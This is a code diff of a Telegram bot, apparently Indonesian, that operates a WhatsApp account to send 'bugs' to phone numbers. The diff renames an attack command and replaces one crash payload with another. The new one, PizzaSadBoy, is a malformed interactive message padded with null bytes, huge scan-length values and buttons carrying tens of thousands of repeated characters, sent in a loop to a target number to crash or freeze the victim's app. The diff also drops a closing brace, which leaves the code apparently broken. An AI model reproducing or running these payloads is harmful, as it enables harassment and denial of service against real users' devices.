@@ -1269,28 +1269,27 @@ bot.action("Xdewa", async (ctx) => {
   const caption = `
 <blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>
 
-<code>
-╔══════════════════════════════╗
-║         👑 𝐃𝐄𝐕 𝐈𝐍𝐅𝐎           ║
-╠══════════════════════════════╣
-║ ✦ Developer  : @gaxx4u
-║ ✦ Version    : 1.0
-║ ✦ Module     : Telegram
-║ ✦ Type Script: Bebas Spam
-╠══════════════════════════════╣
-║         🛠️ 𝐓𝐎𝐎𝐋𝐒 𝐋𝐈𝐒𝐓          ║
-╠══════════════════════════════╣
-║ ➥ /tiktokdl   - TikTok DL
-║ ➥ /cekkontol  - Cek Kontol
-║ ➥ /cekkhodam  - Cek Khodam
-║ ➥ /cekcantik  - Cek Cantik
-║ ➥ /iqc        - iPhone Quote
-╠══════════════════════════════╣
-║      📌 𝐗𝐎𝐍𝐓𝐎𝐇 𝐏𝐄𝐌𝐀𝐊𝐈𝐀𝐍        ║
-╠══════════════════════════════╣
-║ 💡 /iqc 18:00|40|Indosat|hai
-╚══════════════════════════════╝
-</code>
+<pre>
+╭───「 👑 𝐃𝐄𝐕 𝐈𝐍𝐅𝐎 」───⦁
+│ ✦ Developer  : @gaxx4u
+│ ✦ Version    : 1.0
+│ ✦ Module     : Telegram
+│ ✦ Type Script: Bebas Spam
+╰───────────────⦁
+
+╭───「 🛠️ 𝐓𝐎𝐎𝐋𝐒 𝐋𝐈𝐒𝐓 」───⦁
+│ ➥ /tiktokdl   - TikTok DL
+│ ➥ /cekkontol  - Cek Kontol
+│ ➥ /cekkhodam  - Cek Khodam
+│ ➥ /cekcantik  - Cek Cantik
+│ ➥ /iqc        - iPhone Quote
+╰───────────────⦁
+
+╭───「 📌 𝐗𝐎𝐍𝐓𝐎𝐇 𝐏𝐄𝐌𝐀𝐊𝐈𝐀𝐍 」───⦁
+│ 💡 Format: 
+│ /iqc 18:00|40|Indosat|hai
+╰───────────────⦁
+</pre>
 `;
 
   await ctx.editMessageMedia(
@@ -1304,13 +1303,12 @@ bot.action("Xdewa", async (ctx) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart", style: "primary" }
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart" }
           ]
         ]
       }
     }
   );
-});
 
 // ==================== ATTACK PAGE 1 ==================== //
 bot.action("xbugs", async (ctx) => {
@@ -2356,13 +2354,13 @@ function sleep(ms) {
 }
 
 // ~ Case Bug 1 ~ \\
-bot.command("Xbugs", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
+bot.command("ModeDelay", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply("Contoh : /Xbugs 628xx");
+  if (!q) return ctx.reply("Contoh : /ModeDelay 628xx");
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  await detectPV(ctx, "/Xbugs", q);
+  await detectPV(ctx, "/ModeDelay", q);
 
   
   if (ctx.chat.type === "private") {
@@ -2383,8 +2381,8 @@ bot.command("Xbugs", checkChannel, checkCooldown, checkWhatsAppConnection, async
     },
   });
 
-  for (let i = 0; i < 35; i++) {
-    await TegalCtyDelay(sock, target);
+  for (let i = 0; i < 25; i++) {
+    await PizzaSadBoy(sock, target);
     await sleep(1000);
     console.log(`Succes Sending Bugs To : ${target}`);
   }
@@ -2877,30 +2875,92 @@ async function CrashInvisByTegal(sock, target) {
     }
 }
 
-async function TegalCtyDelay(sock, target) {
-    try {
-        const rezz = {
-            groupStatusMessageV2: {
-                message: {
-                    interactiveMessage: {
-                        body: {
-                            text: "\u200D"+"\u200b"
-                        },
-                        nativeFlowMessage: {
-                            messageParamsJson: "[".repeat(10000),
-                            buttons: "\u200D".repeat(250000) + "\u200D".repeat(250000)
-                        }
-                    }
-                }
-            }
-        };
-        
-        await sock.relayMessage(target, rezz, { participant: { jid: target } });
-        
-        return { status: true, message: "Delay invisible successfully" };
-    } catch (error) {
-        return { status: false, error: error.message };
-    }
+async function PizzaSadBoy(sock, target) {
+    const PizzaMsg = {
+        interactiveMessage: {
+            header: {
+                title: "ꪸ⃟🩸 𝐋 𝐀 𝐑 𝐈 𝐀 𝐃 𝐀 𝐏 𝐈 𝐙 𝐙 𝐀 🩸ꪸ⃟",
+                },
+            body: {},
+            footer: {
+                text: "🩸 𝐏 𝐈 𝐙 𝐙 𝐀 𝐇 𝐄 𝐑 𝐄 🩸",
+                hasMediaAttachment: true,
+      imageMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
+              mimetype: "image/jpeg",
+              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
+              fileLength: "11887",
+              height: 1080,
+              width: 1080,
+              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
+              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
+              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1750124469",
+              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
+              contextInfo: {
+                pairedMediaType: "NOT_PAIRED_MEDIA",
+                isQuestion: true,
+                isGroupStatus: true
+              },
+              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
+              scanLengths: [
+                9999999999999999999,
+                9999999999999999999,
+                9999999999999999999,
+                9999999999999999999
+              ],
+              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
+            },
+            title: " ⃰ꪸ⃟",
+            hasMediaAttachment: true
+          },
+          body: {
+            text: "\0"
+          },
+            nativeFlowMessage: {
+                            buttons: [
+                                {
+                                    name: "booking_status",
+                                    buttonParamsJson: "\u0000"
+                                },
+                                {
+                                   name: "galaxy_message", 
+                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
+                                 },
+                                 {
+                                   name: "galaxy_message", 
+                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
+                                 },
+                                 {
+                                   name: "galaxy_message", 
+                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
+                                 },
+                                 {
+                                   name: "galaxy_message", 
+                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
+                                 },
+                                 {
+                                   name: "galaxy_message", 
+                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦾ".repeat(25000), flow_message_version: "3" })
+                                 },
+                                 {
+                                   name: "galaxy_message", 
+                                   buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "ꦽ".repeat(15000), flow_message_version: "3" })
+                                 }
+                    ]
+                },
+            contextInfo: {
+                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
+                quotedMessage: {
+                    conversation: "𝖷𝟩 𝖤𝗑𝗉𝗅𝗈𝗌𝗍"
+                    },
+                }
+            }
+        }
+         
+        await sock.relayMessage(target,PizzaMsg,{
+            participant: { jid: target }
+            })
 }
 
 // ~ End Function Bugs ~ \\
